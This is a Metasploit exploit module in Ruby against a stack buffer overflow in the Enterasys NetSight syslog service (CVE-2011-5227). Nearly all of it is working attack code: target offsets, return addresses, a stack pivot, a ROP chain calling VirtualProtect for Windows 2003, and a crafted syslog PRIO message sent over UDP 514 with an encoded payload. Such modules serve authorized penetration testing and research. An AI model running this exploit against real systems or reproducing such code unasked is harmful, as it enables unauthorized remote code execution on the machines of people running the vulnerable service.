##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Enterasys NetSight nssyslogd.exe Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Enterasys NetSight. The
				vulnerability exists in the Syslog service (nssylogd.exe) when parsing a specially
				crafted PRIO from a syslog message. The module has been tested successfully on
				Enterasys NetSight 4.0.1.34 over Windows XP SP3 and Windows 2003 SP2.
			},
			'Author'         =>
				[
					'Jeremy Brown', # Vulnerability discovery
					'rgod <rgod[at]autistici.org>', # Vulnerability discovery
					'juan vazquez' # Metasploit module
				],
			'References'     =>
				[
					['CVE', '2011-5227'],
					['OSVDB', '77971'],
					['BID', '51124'],
					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-350/'],
					['URL', 'https://cp-enterasys.kb.net/article.aspx?article=14206&p=1']
				],
			'Payload'        =>
				{
					'BadChars' => "\x00",
					'Space' => 3000,
					'DisableNops' => true,
					'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff" # Stack adjustment # add esp, -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Enterasys NetSight 4.0.1.34 / Windows XP SP3',
						{
							'Offset' => 43,
							'Ret' => 0x77c4e444 # ADD ESP,30 # POP EDX # RETN # from msvcrt
						}
					],
					['Enterasys NetSight 4.0.1.34 / Windows 2003 SP2',
						{
							'Offset' => 43,
							'Ret' => 0x77bdf444 # ADD ESP,30 # POP EDX # RETN # from msvcrt
						}
					]
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Dec 19 2011',
			'DefaultTarget'  => 1
			))

		register_options([ Opt::RPORT(514) ], self.class)
	end

	def junk(n=4)
		return rand_text_alpha(n).unpack("V")[0].to_i
	end

	def nop
		return make_nops(4).unpack("V")[0].to_i
	end

	def get_stackpivot
		stack_pivot = ''
		case target.name
		when /Windows XP SP3/
			stack_pivot << [0x77c4e448].pack("V") #ret
			stack_pivot << [0x77c4e448].pack("V") #ret
			stack_pivot << [0x77c4e448].pack("V") #ret
			stack_pivot << [0x77c4e448].pack("V") #ret
			stack_pivot << [0x77c4e444].pack("V") # ADD ESP,30 # POP EDX # RETN
		when /Windows 2003 SP2/
			stack_pivot << [0x77bdf448].pack("V") #ret
			stack_pivot << [0x77bdf448].pack("V") #ret
			stack_pivot << [0x77bdf448].pack("V") #ret
			stack_pivot << [0x77bdf448].pack("V") #ret
			stack_pivot << [0x77bdf444].pack("V") # ADD ESP,30 # POP EDX # RETN
		end
		return stack_pivot
	end

	def get_payload
		my_payload = ''

		case target.name
		when /Windows XP SP3/
			jmp_esp = [0x77c35459].pack("V")
			my_payload << jmp_esp
		when /Windows 2003 SP2/
			rop_gadgets =
				[
					0x77bb2563, # POP EAX # RETN
					0x77ba1114, # <- *&VirtualProtect()
					0x77bbf244, # MOV EAX,DWORD PTR DS:[EAX] # POP EBP # RETN
					junk,
					0x77bb0c86, # XCHG EAX,ESI # RETN
					0x77bc9801, # POP EBP # RETN
					0x77be2265, # ptr to 'push esp #  ret'
					0x77bb2563, # POP EAX # RETN
					#0x03C0990F,
					0x03c09f0f,
					0x77bdd441, # SUB EAX, 03c0940f  (dwSize, 0xb00 -> ebx)
					0x77bb48d3, # POP EBX, RET
					0x77bf21e0, # .data
					0x77bbf102, # XCHG EAX,EBX # ADD BYTE PTR DS:[EAX],AL # RETN
					0x77bbfc02, # POP ECX # RETN
					0x77bef001, # W pointer (lpOldProtect) (-> ecx)
					0x77bd8c04, # POP EDI # RETN
					0x77bd8c05, # ROP NOP (-> edi)
					0x77bb2563, # POP EAX # RETN
					0x03c0984f,
					0x77bdd441, # SUB EAX, 03c0940f
					0x77bb8285, # XCHG EAX,EDX # RETN
					0x77bb2563, # POP EAX # RETN
					nop,
					0x77be6591, # PUSHAD # ADD AL,0EF # RETN
				].pack("V*")
			my_payload << rop_gadgets
		end

		my_payload << payload.encoded
		return my_payload
	end

	def exploit
		connect_udp

		prio = "<"
		prio << rand_text_alpha(19)
		prio << get_stackpivot
		prio << rand_text_alpha(4)
		prio << [target.ret].pack("V")
		prio << ">"

		message = prio
		message << rand_text_alpha(9 + (15 - Rex::Socket.source_address(datastore['RHOST']).length)) # Allow to handle the variable offset due to the source ip length
		message << get_payload

		print_status("#{rhost}:#{rport} - Trying to exploit #{target.name}...")
		udp_sock.put(message)

		disconnect_udp
	end

end
